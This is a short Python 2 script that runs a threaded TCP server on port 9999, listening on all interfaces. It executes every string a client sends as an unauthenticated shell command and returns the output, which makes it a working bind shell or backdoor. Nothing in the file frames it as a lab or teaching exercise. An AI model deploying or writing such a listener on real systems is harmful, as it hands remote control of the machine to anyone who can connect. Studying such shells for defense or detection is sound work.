#!/usr/bin/env python
import os
import SocketServer

class myTCPHandler(SocketServer.BaseRequestHandler):
	def handle(self):
		print "got connection from:", self.client_address
		while 1:
			self.data  = self.request.recv(4096)
			print self.data
			if not self.data:break
			print 'will run this on server:',self.data
			cmd = "%s 2>/dev/null" % self.data 
			result = os.popen(cmd).read()
			if not result:
				result = 'Error'
			self.request.sendall(result)
	


h,p = '',9999
try:
	server = SocketServer.ThreadingTCPServer((h,p), myTCPHandler)
	server.serve_forever()
except KeyboardInterrupt:
	server.shutdown()
